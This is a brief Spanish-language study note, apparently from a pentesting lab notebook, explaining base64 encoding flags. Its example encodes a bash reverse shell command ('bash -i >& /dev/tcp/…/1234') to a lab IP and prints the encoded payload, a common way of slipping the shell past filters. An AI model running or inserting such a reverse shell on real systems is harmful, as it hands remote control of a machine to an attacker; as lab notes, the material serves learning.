formato que permite almacenan en texto datos como foto etc, ej:
```bash
base64 -d encodeFile
```

	1. -d: para el modo desenciptark
	2. -w: hacemos que la salida del comando sea en una sola linea para evitar saltos de linea que luego nos pordrian molestar

Ejemplos: 
```bash
  echo "bash -i >& /dev/tcp/10.10.14.212/1234 0>&1" | base64 -w 0
```
`echo "bash -i >& /dev/tcp/10.10.14.212/1234 0>&1" | base64 -w 0 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTIvMTIzNCAwPiYxCg==`


es recomendable hacerlo con un `-n` para que no nos meta un salto de linea extra

![[Pasted image 20240117202127 1.png]]
